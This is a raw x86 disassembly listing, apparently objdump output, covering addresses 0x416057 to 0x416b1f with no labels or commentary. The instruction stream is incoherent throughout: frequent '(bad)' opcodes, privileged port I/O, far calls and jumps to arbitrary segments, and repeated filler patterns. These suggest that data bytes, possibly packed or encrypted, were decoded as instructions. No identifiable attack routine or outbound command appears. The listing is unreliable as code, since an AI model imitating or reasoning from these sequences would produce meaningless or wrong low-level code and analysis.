  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	xchg   esp,eax
  416063:	mov    ebx,0xed670316
  416068:	add    BYTE PTR [eax],al
  41606a:	add    BYTE PTR [ecx],al
  41606c:	add    BYTE PTR [eax],al
  41606e:	out    0x20,eax
  416070:	sbb    ch,BYTE PTR [edx+edi*1+0x34195843]
  416077:	sbb    DWORD PTR [ebx-0xf],0xf4ddb289
  41607e:	clc    
  41607f:	inc    edx
  416080:	outs   dx,DWORD PTR ds:[esi]
  416081:	xchg   ecx,eax
  416082:	xor    edx,DWORD PTR [ebp-0x20]
  416085:	leave  
  416086:	ret    0x607d
  416089:	cmp    edi,DWORD PTR [edx+0x30d95aa6]
  41608f:	or     DWORD PTR [ebx],ebx
  416091:	ins    BYTE PTR es:[edi],dx
  416092:	imul   eax,esp,0xe9ebbb6
  416098:	jns    0x4160c3
  41609a:	jnp    0x4160c8
  41609c:	shl    DWORD PTR [edx-0x55],1
  41609f:	outs   dx,DWORD PTR ds:[esi]
  4160a0:	jo     0x416088
  4160a2:	jmp    0xae8c7448
  4160a7:	ret    
  4160a8:	xchg   esp,eax
  4160a9:	fisub  DWORD PTR [edi]
  4160ab:	into   
  4160ac:	mov    dh,dh
  4160ae:	or     BYTE PTR [esi],dl
  4160b0:	mov    ebx,0x90c3e888
  4160b5:	and    DWORD PTR [ebx+0x2d],0x17254c00
  4160bc:	sub    al,0xdd
  4160be:	fbld   TBYTE PTR [ebp+0x7e]
  4160c1:	in     eax,dx
  4160c2:	push   ss
  4160c3:	sbb    edi,DWORD PTR [ecx]
  4160c5:	dec    ecx
  4160c6:	ret    
  4160c7:	ss xchg edi,eax
  4160c9:	popf   
  4160ca:	inc    edx
  4160cb:	mov    bh,0x83
  4160cd:	rol    ecx,0x66
  4160d0:	inc    ecx
  4160d1:	in     eax,dx
  4160d2:	lock cmp ebx,DWORD PTR [ebx+0x2887df4f]
  4160d9:	mov    di,WORD PTR [edi+0x10]
  4160dd:	call   0x82ae3055
  4160e2:	push   ss
  4160e3:	jns    0x41611b
  4160e5:	shr    DWORD PTR [edx+0x361f70a0],0x93
  4160ec:	dec    edx
  4160ed:	fwait
  4160ee:	popa   
  4160ef:	scas   eax,DWORD PTR es:[edi]
  4160f0:	ja     0x41611f
  4160f2:	xchg   esi,eax
  4160f3:	inc    esi
  4160f4:	cmp    ebp,esi
  4160f6:	mov    dh,0x2a
  4160f8:	jns    0x41612a
  4160fa:	push   ebp
  4160fb:	mov    bh,0xca
  4160fd:	xor    DWORD PTR [edi],0xffffffcf
  416100:	retf   0xb179
  416103:	or     eax,0x2272ca44
  416108:	jne    0x416175
  41610a:	sbb    eax,0xa2788f40
  41610f:	mov    ebx,ebp
  416111:	mov    bh,0x9f
  416113:	pop    ebp
  416114:	jae    0x416160
  416116:	(bad)  
  416117:	inc    esi
  416118:	aad    0x8d
  41611a:	or     eax,0xac60e247
  41611f:	fwait
  416120:	mov    dh,0xb7
  416122:	dec    ebp
  416123:	fadd   DWORD PTR [ebx+0x67]
  416126:	(bad)  
  416127:	push   ebp
  416128:	dec    eax
  416129:	cmp    DWORD PTR [edx-0x4c],ebp
  41612c:	outs   dx,BYTE PTR ds:[esi]
  41612d:	and    esi,edi
  41612f:	jnp    0x41615d
  416131:	daa    
  416132:	dec    esp
  416133:	das    
  416134:	dec    esp
  416135:	ins    DWORD PTR es:[edi],dx
  416136:	jnp    0x416186
  416138:	fs int3 
  41613a:	arpl   WORD PTR [esi+0x136794a],dx
  416140:	popf   
  416141:	cwde   
  416142:	jmp    DWORD PTR [esi-0x3a]
  416145:	out    0x9,al
  416147:	outs   dx,DWORD PTR ds:[esi]
  416148:	ss iret 
  41614a:	inc    esp
  41614b:	pop    ss
  41614c:	add    DWORD PTR [ebx+0x66598d0e],eax
  416152:	cmc    
  416153:	add    DWORD PTR [ebx-0x45],ecx
  416156:	imul   ebp,DWORD PTR [ebx-0x4b],0xe325f990
  41615d:	(bad)  
  41615e:	aaa    
  41615f:	xor    cl,BYTE PTR [ebp-0x249164ff]
  416165:	cld    
  416166:	sahf   
  416167:	mov    WORD PTR [ebx-0x48],ss
  41616a:	sub    ah,BYTE PTR [ebx-0x2b]
  41616d:	mov    bl,0x0
	...
  4161d3:	add    BYTE PTR [eax],al
  4161d5:	add    BYTE PTR [eax],ah
  4161d7:	jmp    0xdf3d4017
  4161dc:	in     eax,0xff
  4161de:	(bad)  
  4161df:	push   edx
  4161e0:	sub    eax,0x3a3c65f3
  4161e5:	xchg   ecx,eax
  4161e6:	addr16 out dx,al
  4161e8:	add    BYTE PTR [eax],al
  4161ea:	add    BYTE PTR [ecx],al
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161ef:	sub    BYTE PTR [ecx-0x17],0x41
  4161f3:	arpl   WORD PTR [edx+0x21],bp
  4161f6:	or     dl,BYTE PTR [edx-0x73000e8a]
  4161fc:	pop    esi
  4161fd:	lahf   
  4161fe:	add    al,0x3b
  416200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416201:	sub    eax,DWORD PTR [esi]
  416203:	or     BYTE PTR [ebp-0x42],0x47
  416207:	and    BYTE PTR [ecx],ah
  416209:	retf   0xea08
  41620c:	cdq    
  41620d:	test   BYTE PTR [ecx-0x15efb98c],bh
  416213:	sub    eax,0x4d95cd06
  416218:	jmp    0xcb843b19
  41621d:	(bad)  
  41621e:	push   ecx
  41621f:	dec    BYTE PTR [ebx+ebp*8-0x6a794382]
  416226:	mov    esi,0x8fdb621a
  41622b:	rcr    eax,cl
  41622d:	xchg   edi,eax
  41622e:	jae    0x416249
  416230:	fistp  QWORD PTR [esi+ebx*8]
  416233:	ins    BYTE PTR es:[edi],dx
  416234:	push   edi
  416235:	push   ebp
  416236:	push   edx
  416237:	sub    BYTE PTR [ecx+ebp*8],bh
  41623a:	mov    al,ds:0x8299eae7
  41623f:	adc    DWORD PTR [edi],edi
  416241:	mov    ebp,0xde76feba
  416246:	xor    dl,BYTE PTR [edx+0x36]
  416249:	shl    DWORD PTR [edx-0x2c249370],1
  41624f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416250:	cmp    DWORD PTR [ebx],ebp
  416252:	bound  esi,QWORD PTR ds:0xeddf7ce8
  416258:	mov    DWORD PTR [ebx],edi
  41625a:	ret    
  41625b:	add    dh,BYTE PTR [bx+si]
  41625e:	push   esi
  41625f:	retf   0x1479
  416262:	dec    ecx
  416263:	ja     0x416217
  416265:	or     eax,0x5527d4ef
  41626a:	mov    al,ds:0x6ee6ea
  41626f:	pop    esp
  416270:	ja     0x41624b
  416272:	jmp    0xe5c2ee5e
  416277:	pop    ebx
  416278:	sub    al,0x5c
  41627a:	ja     0x41621b
  41627c:	xor    DWORD PTR [ecx-0x42],edx
  41627f:	mov    bl,0xa5
  416281:	adc    bl,BYTE PTR [ebx+0x3d52e75]
  416287:	lods   al,BYTE PTR ds:[esi]
  416288:	call   0x8d5f1dae
  41628d:	sbb    dl,cl
  41628f:	push   ebp
  416290:	add    bl,BYTE PTR [ebp-0x7d70cca]
  416296:	cmp    eax,0xeb71e597
  41629b:	in     al,dx
  41629c:	adc    esi,esi
  41629e:	dec    ebx
  41629f:	pop    ss
  4162a0:	or     eax,0x90de89a7
  4162a5:	dec    edx
  4162a6:	lock imul edi
  4162a9:	xchg   edi,eax
  4162aa:	enter  0xf5e0,0xe
  4162ae:	sbb    dl,BYTE PTR [edx]
  4162b0:	mov    edi,0xf74be3d9
  4162b5:	dec    esp
  4162b6:	inc    ebx
  4162b7:	aam    0x5f
  4162b9:	sar    BYTE PTR [esi+0x5b0b78a3],0x54
  4162c0:	jns    0x4162a4
  4162c2:	out    0xe8,al
  4162c4:	pop    edx
  4162c5:	pop    ds
  4162c6:	ins    DWORD PTR es:[edi],dx
  4162c7:	out    0xdc,al
  4162c9:	add    BYTE PTR [edi+0xf550a4d],cl
  4162cf:	mov    ds:0x42b2ea1a,eax
  4162d4:	and    eax,0x68051367
  4162d9:	pop    eax
  4162da:	rcr    edi,1
  4162dc:	dec    ebx
  4162dd:	repnz adc ecx,DWORD PTR [eax-0x23]
  4162e1:	fwait
  4162e2:	popf   
  4162e3:	mov    cl,0x2c
  4162e5:	fsub   DWORD PTR [edi]
  4162e7:	xor    eax,0x49b2e072
  4162ec:	mov    WORD PTR [ebp+0x0],fs
	...
  416356:	and    ebp,DWORD PTR [esi+0x32]
  416359:	and    eax,0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x67f0:0x9f4ce7ee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	add    BYTE PTR [ecx],al
  41636c:	add    BYTE PTR [eax],al
  41636e:	pop    ebx
  41636f:	adc    BYTE PTR [edi],al
  416371:	cmp    bh,cl
  416373:	(bad)  
  416375:	aaa    
  416376:	lds    eax,FWORD PTR [ebp+0x39ae4465]
  41637c:	mov    edi,0x5e06a97d
  416381:	pop    ds
  416382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416383:	mov    edi,0x2d23da8f
  416388:	mov    ds,WORD PTR [edx+0x75]
  41638b:	js     0x41637a
  41638d:	mov    eax,gs
  41638f:	mov    bl,0x48
  416391:	add    BYTE PTR [edi+0x50],cl
  416394:	ret    0xb728
  416397:	lods   al,BYTE PTR ds:[esi]
  416398:	xchg   ecx,eax
  416399:	mov    al,0xd6
  41639b:	fwait
  41639c:	sti    
  41639d:	push   cs
  41639e:	js     0x4163bb
  4163a0:	jae    0x4163f6
  4163a2:	mov    bl,0xf5
  4163a4:	sbb    DWORD PTR es:[esi+ebp*2+0x76],0xffffff9e
  4163aa:	sub    ch,BYTE PTR [ecx]
  4163ac:	in     al,dx
  4163ad:	mov    eax,0x92b1bf50
  4163b2:	test   ebp,0x2b52a1a
  4163b8:	or     al,0x91
  4163ba:	cld    
  4163bb:	dec    ecx
  4163bc:	out    dx,al
  4163bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163be:	jb     0x41641c
  4163c0:	es out dx,eax
  4163c2:	sub    BYTE PTR [edi+0x4],bh
  4163c5:	lods   al,BYTE PTR ds:[esi]
  4163c6:	push   ecx
  4163c7:	pusha  
  4163c8:	int3   
  4163c9:	fimul  DWORD PTR [esi+0x51589bd7]
  4163cf:	xchg   edx,eax
  4163d0:	xchg   ebp,eax
  4163d1:	sar    DWORD PTR [esp+edx*1+0x0],0xed
  4163d6:	inc    esi
  4163d7:	mov    al,0x97
  4163d9:	outs   dx,DWORD PTR ds:[esi]
  4163da:	cmp    bl,dl
  4163dc:	push   eax
  4163dd:	or     eax,0xe681724a
  4163e2:	sbb    eax,0x554aee6d
  4163e7:	push   esp
  4163e8:	pop    edi
  4163e9:	les    edi,FWORD PTR [eax+eax*8+0xb56e047]
  4163f0:	sub    al,0xbc
  4163f2:	paddb  mm3,QWORD PTR [edi]
  4163f5:	jb     0x416472
  4163f7:	rol    BYTE PTR [eax],1
  4163f9:	sbb    al,0x17
  4163fb:	sub    ah,BYTE PTR [edi-0x2c4ef149]
  416401:	popa   
  416402:	test   eax,0xfc1e1912
  416407:	aam    0xf2
  416409:	sbb    al,0xb0
  41640b:	in     eax,0x29
  41640d:	xchg   ecx,eax
  41640e:	sbb    esi,DWORD PTR [esi+esi*8+0x5c80dcc]
  416415:	inc    ebx
  416416:	pusha  
  416417:	push   0x41
  416419:	jp     0x41641a
  41641b:	add    eax,0xe168ab2d
  416420:	scas   eax,DWORD PTR es:[edi]
  416421:	test   BYTE PTR [edi+0x51269a5d],dl
  416427:	mov    ch,cl
  416429:	std    
  41642a:	mov    dl,0xa1
  41642c:	loope  0x41641e
  41642e:	fcomp  st(2)
  416430:	and    esi,ecx
  416432:	cwde   
  416433:	push   es
  416434:	fs cwde 
  416436:	jge    0x4164af
  416438:	pop    edi
  416439:	dec    eax
  41643a:	imul   ebp,DWORD PTR [edx+edx*2+0x2e],0xffffffad
  41643f:	xor    al,0xe5
  416441:	(bad)  
  416442:	std    
  416443:	mov    al,0xcf
  416445:	xor    DWORD PTR [ebp-0x5e6d58dd],0xee014ea9
  41644f:	ret    
  416450:	xchg   esp,eax
  416451:	push   0x39c114d1
  416456:	pop    edx
  416457:	in     al,dx
  416458:	leave  
  416459:	out    dx,al
  41645a:	iret   
  41645b:	push   ss
  41645c:	jae    0x416440
  41645e:	add    al,0xe2
  416460:	mov    al,ds:0x4a61588c
  416465:	clc    
  416466:	push   eax
  416467:	mov    dl,0xd3
  416469:	sub    BYTE PTR [ebp+0xc9c10b],al
	...
  4164d3:	add    BYTE PTR [eax],al
  4164d5:	add    bl,dh
  4164d7:	inc    ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	clc    
  4164e3:	in     eax,dx
  4164e4:	jne    0x4164ed
  4164e6:	lock add BYTE PTR [bx+si],al
  4164ea:	add    BYTE PTR [ecx],al
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	(bad)  
  4164ef:	data16 js 0x41655c
  4164f2:	call   0xfb39d4f8
  4164f7:	xchg   edi,eax
  4164f8:	dec    esp
  4164f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164fa:	sub    BYTE PTR [eax+0x1f940665],dh
  416500:	mov    BYTE PTR [ecx],dl
  416502:	mov    eax,0x7c33ed05
  416507:	lock scas al,BYTE PTR es:[edi]
  416509:	pcmpgtb mm2,QWORD PTR [edi]
  41650c:	sub    al,0x8
  41650e:	inc    ebx
  41650f:	dec    esi
  416510:	xchg   esp,eax
  416511:	add    eax,0x2ca1806b
  416516:	das    
  416517:	fidiv  DWORD PTR [ebp-0xe]
  41651a:	xchg   ecx,eax
  41651b:	mov    edi,0x78db857c
  416520:	fsubr  st,st(3)
  416522:	fwait
  416523:	nop
  416524:	jecxz  0x416542
  416526:	sahf   
  416527:	hlt    
  416528:	shl    BYTE PTR [esi-0x32],0xf7
  41652c:	sub    al,0x55
  41652e:	mov    dh,0x16
  416530:	ja     0x41650c
  416532:	out    dx,eax
  416533:	das    
  416534:	add    al,0xbd
  416536:	sbb    DWORD PTR [esi-0x42406aa5],0xd6df4f98
  416540:	adc    dh,BYTE PTR [edx+esi*4+0xa8a0f2e]
  416547:	mov    esi,0xd7b65642
  41654c:	mov    edx,0xb9b96bd5
  416551:	mov    edx,0x3aa4a1fe
  416556:	aam    0x3a
  416558:	xor    al,0xb9
  41655a:	std    
  41655b:	std    
  41655c:	pusha  
  41655d:	sar    DWORD PTR [ebp-0x4a],0x76
  416561:	jb     0x416588
  416563:	repnz hlt 
  416565:	dec    edi
  416566:	out    0x83,eax
  416568:	icebp  
  416569:	ret    0x19a2
  41656c:	inc    esp
  41656d:	sub    ah,BYTE PTR [edx]
  41656f:	call   0x48ae:0x169b2301
  416576:	add    DWORD PTR [esi+0x72],0xfffffff0
  41657a:	es retf 0x766b
  41657e:	test   eax,0xfad47997
  416583:	data16 cs rcl dl,0x5d
  416588:	and    al,0x63
  41658a:	sbb    al,0xec
  41658c:	out    dx,al
  41658d:	sti    
  41658e:	mov    ebp,0x81c74db
  416593:	in     al,0xeb
  416595:	mov    dh,0x3e
  416597:	pop    ebp
  416598:	outs   dx,BYTE PTR ds:[esi]
  416599:	out    dx,eax
  41659a:	out    dx,al
  41659b:	lods   eax,DWORD PTR ds:[esi]
  41659c:	and    eax,0x8d51b143
  4165a1:	mov    ecx,0xcdf98940
  4165a6:	leave  
  4165a7:	fimul  WORD PTR [edi-0x14cc5fa2]
  4165ad:	fcmovne st,st(5)
  4165af:	push   esp
  4165b0:	aas    
  4165b1:	fs dec edi
  4165b3:	mov    ebx,edi
  4165b5:	stos   BYTE PTR es:[edi],al
  4165b6:	pop    esp
  4165b7:	scas   eax,DWORD PTR es:[edi]
  4165b8:	or     al,0xc0
  4165ba:	rcr    DWORD PTR ds:0x1177df73,0x7e
  4165c1:	imul   edx,ebp,0xffffffbb
  4165c4:	mov    esi,0xc72d71cf
  4165c9:	jg     0x416620
  4165cb:	lahf   
  4165cc:	jnp    0x416618
  4165ce:	pop    edx
  4165cf:	dec    ecx
  4165d0:	aam    0x45
  4165d2:	adc    ebx,ecx
  4165d4:	xchg   edx,eax
  4165d5:	sbb    eax,0x270a8c27
  4165da:	jno    0x4165a8
  4165dc:	cmp    DWORD PTR [esi+0x66],edi
  4165df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165e0:	mov    dl,0xf9
  4165e2:	aaa    
  4165e3:	sub    edx,DWORD PTR [ebx-0x39]
  4165e6:	std    
  4165e7:	out    0x2f,al
  4165e9:	sbb    eax,0x24fd9ea1
	...
  416656:	and    eax,0xfff32bd8
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi-0x61b04354]
  416663:	xchg   ecx,eax
  416664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416665:	inc    edx
  416666:	addr16 icebp 
  416668:	add    BYTE PTR [eax],al
  41666a:	add    BYTE PTR [ecx],al
  41666c:	add    BYTE PTR [eax],al
  41666e:	add    eax,0x53af151e
  416673:	push   0x3d817372
  416678:	jl     0x4166ba
  41667a:	pop    ds
  41667b:	ret    0xefcf
  41667e:	push   ecx
  41667f:	pushf  
  416680:	sbb    eax,0xdef097f2
  416685:	xchg   ebp,eax
  416686:	dec    esi
  416687:	addr16 inc ecx
  416689:	lea    edi,[edi+0x20]
  41668c:	fsub   st(0),st
  41668e:	or     DWORD PTR ds:0xc1d50bde,ecx
  416694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416695:	dec    esp
  416696:	repz xor ah,0xc7
  41669a:	xchg   ebx,eax
  41669b:	xor    BYTE PTR [ebp+0x5b],bh
  41669e:	add    al,0x62
  4166a0:	cs daa 
  4166a2:	mov    esp,0x457dba0e
  4166a7:	call   0x8740efef
  4166ac:	int    0xac
  4166ae:	mov    eax,ds:0x189dde43
  4166b3:	push   eax
  4166b4:	cwde   
  4166b5:	out    0x8b,al
  4166b7:	push   esi
  4166b8:	inc    ebx
  4166b9:	jge    0x4166e1
  4166bb:	arpl   bx,cx
  4166bd:	mov    esi,0x552c192f
  4166c2:	adc    eax,0x6d732dc7
  4166c7:	enter  0xbe84,0x72
  4166cb:	jo     0x416665
  4166cd:	pop    ebp
  4166ce:	outs   dx,BYTE PTR ds:[esi]
  4166cf:	and    eax,0x356cd4de
  4166d4:	xor    DWORD PTR ds:0x838ffc7,edi
  4166da:	inc    ecx
  4166db:	xchg   esp,eax
  4166dc:	xchg   ebp,eax
  4166dd:	inc    ebp
  4166de:	retf   
  4166df:	jae    0x4166c4
  4166e1:	fxch   st(2)
  4166e3:	call   0x9c08:0x245432fe
  4166ea:	es (bad) 
  4166ed:	out    dx,al
  4166ee:	xchg   BYTE PTR [edx+eiz*2],ah
  4166f1:	int    0x29
  4166f3:	sbb    dl,BYTE PTR ss:[eax+0x57]
  4166f7:	and    dl,bl
  4166f9:	out    dx,eax
  4166fa:	not    BYTE PTR [ebx-0x3a]
  4166fd:	aad    0x5c
  4166ff:	cmp    DWORD PTR [edi-0x33],ecx
  416702:	ret    0x8c3a
  416705:	out    dx,al
  416706:	pushfw 
  416708:	daa    
  416709:	stos   BYTE PTR es:[edi],al
  41670a:	mov    ebp,0xab48af7c
  41670f:	clc    
  416710:	or     eax,0x1ebe07bf
  416715:	int3   
  416716:	ss stos DWORD PTR es:[edi],eax
  416718:	sbb    eax,0xec8cd578
  41671d:	or     DWORD PTR ss:[esi+0x1a440490],esi
  416724:	fxch   st(1)
  416726:	inc    DWORD PTR [eax-0x21b9c17e]
  41672c:	fwait
  41672d:	xchg   ecx,eax
  41672e:	cmp    BYTE PTR [ebx],ah
  416730:	jbe    0x4166be
  416732:	std    
  416733:	adc    eax,0x86478bdf
  416738:	rcl    DWORD PTR [ebp+eiz*1-0x2f],0x28
  41673d:	jmp    0x8db8:0xa7f0dbee
  416744:	rol    DWORD PTR [edx+0x5f309e36],0x7b
  41674b:	das    
  41674c:	mov    edi,0xb4162cb2
  416751:	and    edx,DWORD PTR [eax+0x64d70c50]
  416757:	test   edi,ebx
  416759:	mov    WORD PTR [ebp-0x49b54c94],ss
  41675f:	jecxz  0x416745
  416761:	sbb    DWORD PTR [ecx],edx
  416763:	bound  edx,QWORD PTR [edi-0x35869619]
  416769:	ins    BYTE PTR es:[edi],dx
  41676a:	xor    BYTE PTR [esi+0x27],al
  41676d:	fiadd  DWORD PTR [eax]
	...
  4167d3:	add    BYTE PTR [eax],al
  4167d5:	add    ah,al
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	ret    0x6ad2
  4167e5:	cld    
  4167e6:	repnz add BYTE PTR [bx+si],al
  4167ea:	add    BYTE PTR [ecx],al
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	lock lods al,BYTE PTR ds:[esi]
  4167f0:	das    
  4167f1:	enter  0x3e3b,0x3
  4167f5:	add    DWORD PTR [ebx-0x69],edx
  4167f8:	fsubr  DWORD PTR [edx-0x715332a0]
  4167fe:	in     al,dx
  4167ff:	out    0x7,al
  416801:	(bad)  
  416802:	aas    
  416803:	js     0x41681f
  416805:	repnz adc eax,ebp
  416808:	into   
  416809:	fisubr WORD PTR [ecx]
  41680b:	(bad)  
  41680d:	add    dl,BYTE PTR [ecx+ebp*2]
  416810:	cmp    eax,edi
  416812:	and    bh,0xef
  416815:	cmp    BYTE PTR [edx-0x10e66fe1],dl
  41681b:	push   eax
  41681c:	jb     0x41686d
  41681e:	retf   0xf380
  416821:	into   
  416822:	add    DWORD PTR [eax+ebx*1],edi
  416825:	jmp    0x5548652d
  41682a:	sub    ah,dl
  41682c:	retf   0x57fd
  41682f:	jo     0x41681a
  416831:	call   0x5975:0x95593047
  416838:	mov    eax,ds:0x2fb5515c
  41683d:	in     eax,0x7e
  41683f:	cmp    esp,DWORD PTR [ebx+0x16beb72c]
  416845:	mov    WORD PTR ss:[ebp-0x1872b9ea],fs
  41684c:	out    0x35,eax
  41684e:	loop   0x416868
  416850:	es into 
  416852:	mov    ds:0xae47410a,eax
  416857:	je     0x4167eb
  416859:	daa    
  41685a:	jmp    0x1cbf7868
  41685f:	lea    edx,[ecx]
  416861:	fadd   DWORD PTR [edi]
  416863:	cmp    al,0x2e
  416865:	or     eax,0x21beb6de
  41686a:	push   ss
  41686b:	bound  edx,QWORD PTR [edx+0x419ad843]
  416871:	mov    bh,0x15
  416873:	push   ds
  416874:	or     eax,0xd6d29eaf
  416879:	cmp    al,0x1a
  41687b:	jp     0x416809
  41687d:	je     0x41689a
  41687f:	retf   0x2772
  416882:	and    eax,0x5656a284
  416887:	cmp    DWORD PTR [eax+0x23],eax
  41688a:	push   esi
  41688b:	mov    ds:0xd07c24b,al
  416890:	out    0x6a,eax
  416892:	sub    al,0xac
  416894:	mov    esp,0xa312f210
  416899:	mov    ebx,0x39c55fcd
  41689e:	ficomp WORD PTR [eax+0x62c83bda]
  4168a4:	xor    BYTE PTR [ebx+0xff30c1c],cl
  4168aa:	test   al,0xb7
  4168ac:	aaa    
  4168ad:	in     al,0xc3
  4168af:	retf   
  4168b0:	inc    edx
  4168b1:	mov    ch,0x5b
  4168b4:	mov    es,WORD PTR [esi+0x5d22f869]
  4168ba:	dec    dh
  4168bc:	(bad)  
  4168bd:	aad    0xed
  4168bf:	add    DWORD PTR [edi+0x58],0xc524ba9a
  4168c6:	push   0x24e7de24
  4168cb:	jae    0x41688f
  4168cd:	xchg   edx,eax
  4168ce:	icebp  
  4168cf:	fisttp QWORD PTR [edx-0x5cac9980]
  4168d5:	mov    esi,0xcbb548be
  4168da:	pop    edi
  4168db:	mov    bh,0x14
  4168dd:	and    edx,DWORD PTR [edx+0x3d]
  4168e0:	sbb    BYTE PTR ds:0xae73537a,bl
  4168e6:	iret   
  4168e7:	aad    0x7c
  4168e9:	(bad)  
  4168eb:	sbb    al,BYTE PTR [ebx]
  4168ed:	out    0x0,eax
	...
  416953:	add    BYTE PTR [eax],al
  416955:	add    cl,dl
  416957:	scas   eax,DWORD PTR es:[edi]
  416958:	push   es
  416959:	repz jle 0x416957
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0xdf510731
  416966:	repz add BYTE PTR [bx+si],al
  41696a:	add    BYTE PTR [ecx],al
  41696c:	add    BYTE PTR [eax],al
  41696e:	jmp    0x35335149
  416973:	ficomp WORD PTR [ebp+0x12]
  416976:	xor    ebp,ebx
  416978:	add    al,0x50
  41697a:	jecxz  0x41699d
  41697c:	xchg   edi,eax
  41697d:	jecxz  0x416936
  41697f:	aas    
  416980:	test   BYTE PTR [ebx+0x4a],al
  416983:	xor    al,0x75
  416985:	mov    bh,BYTE PTR [ecx-0x18]
  416988:	dec    esi
  416989:	pop    ds
  41698a:	pop    fs
  41698c:	inc    edx
  41698d:	mov    eax,ds:0xd5c2fc29
  416992:	bound  eax,QWORD PTR [esi-0xf4b1a3b]
  416998:	cwde   
  416999:	push   0xffffffb1
  41699b:	ror    DWORD PTR [ecx+0x76],0xb3
  41699f:	popa   
  4169a0:	imul   edi,DWORD PTR [ebx-0x1c857eb2],0x69
  4169a7:	push   0xfffffffd
  4169a9:	mov    dl,0xb3
  4169ab:	(bad)  
  4169ac:	jo     0x4169bf
  4169ae:	test   al,0x41
  4169b0:	mov    al,ds:0x64ae769d
  4169b5:	imul   DWORD PTR [ebx+0x16f87cf0]
  4169bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169bc:	call   0xfa0cbc45
  4169c1:	jl     0x416978
  4169c3:	adc    dh,BYTE PTR [ebx+ecx*4]
  4169c6:	jmp    0x3490ac9
  4169cb:	outs   dx,BYTE PTR ds:[esi]
  4169cc:	(bad)  
  4169cd:	stc    
  4169ce:	push   0x5f
  4169d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169d1:	fisttp DWORD PTR [ebp+0x50]
  4169d4:	pusha  
  4169d5:	dec    ecx
  4169d6:	arpl   WORD PTR [ebx+esi*1],dx
  4169d9:	in     ax,dx
  4169db:	push   ebx
  4169dc:	and    ebx,DWORD PTR [edi+0x20]
  4169df:	fcomp  QWORD PTR [ebp-0x2e639763]
  4169e5:	aad    0x3a
  4169e7:	xor    DWORD PTR [ecx],edx
  4169e9:	jmp    0x41699f
  4169eb:	dec    esp
  4169ec:	mov    ecx,0x91b9491
  4169f1:	pop    esp
  4169f2:	jg     0x4169f8
  4169f4:	pop    esi
  4169f5:	mov    eax,0x8b8b799
  4169fa:	adc    cl,cl
  4169fc:	push   cs
  4169fd:	push   ecx
  4169fe:	ficom  DWORD PTR [ebp-0x7b7d2f31]
  416a04:	lods   eax,DWORD PTR ds:[esi]
  416a05:	mov    ds:0x6414ef7f,al
  416a0a:	xchg   ebp,eax
  416a0b:	pop    edx
  416a0c:	mov    eax,0x26ea225
  416a11:	mov    al,ds:0x6b171298
  416a16:	sbb    eax,0x329617da
  416a1b:	stc    
  416a1c:	cmp    al,0x6f
  416a1e:	adc    eax,0x7670fcbc
  416a23:	xchg   ebx,eax
  416a24:	jmp    0x4169a9
  416a26:	cmp    BYTE PTR [ebp-0x63],bh
  416a29:	ret    
  416a2a:	adc    BYTE PTR [ecx],al
  416a2c:	(bad)  
  416a2d:	or     DWORD PTR [ebx-0x7c],esi
  416a30:	mov    ebp,0xc92963a6
  416a35:	dec    ecx
  416a36:	lds    ebx,FWORD PTR [ebx-0x59]
  416a39:	xchg   ecx,eax
  416a3a:	jge    0x4169f7
  416a3c:	imul   DWORD PTR [esi-0x42]
  416a3f:	das    
  416a40:	mov    ebx,0x1d2931ff
  416a45:	div    DWORD PTR [ebp-0x6b333dde]
  416a4b:	and    BYTE PTR [esi-0x62],al
  416a4e:	dec    edi
  416a4f:	mov    al,0xeb
  416a51:	sub    eax,0x28c3e580
  416a56:	mov    cl,0xbc
  416a58:	imul   ebx,DWORD PTR [ebp+0x1028cb41],0xffffff86
  416a5f:	mov    ds:0x6df2c834,al
  416a64:	jmp    0x416a39
  416a66:	adc    ebp,ebx
  416a68:	pusha  
  416a69:	xchg   edi,eax
  416a6a:	dec    eax
  416a6b:	jmp    0x425866
	...
  416ad4:	add    BYTE PTR [eax],al
  416ad6:	retf   
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0xbe830ba3
  416ae4:	mov    edi,0xf46775
  416ae9:	add    BYTE PTR [eax],al
  416aeb:	add    DWORD PTR [eax],eax
  416aed:	add    BYTE PTR [ebp+0x15],al
  416af0:	and    eax,0x10cd85a3
  416af5:	and    al,0x3
  416af7:	inc    ebp
  416af8:	ds cmp eax,0x840e10fc
  416afe:	mov    ds:0x526b0d0a,eax
  416b03:	mov    ah,0xfd
  416b05:	ror    BYTE PTR [eax+0x7c],0x3a
  416b09:	or     cl,bl
  416b0b:	dec    esp
  416b0c:	and    edx,eax
  416b0e:	in     eax,dx
  416b0f:	pop    ss
  416b10:	inc    edx
  416b11:	adc    DWORD PTR [edi],edx
  416b13:	pop    eax
  416b14:	(bad)  
  416b16:	imul   eax,ebp,0xbb0d1b9d
  416b1c:	jno    0x416ac9
  416b1e:	dec    eax
  416b1f:	stos   DWORD PTR es:[edi],eax
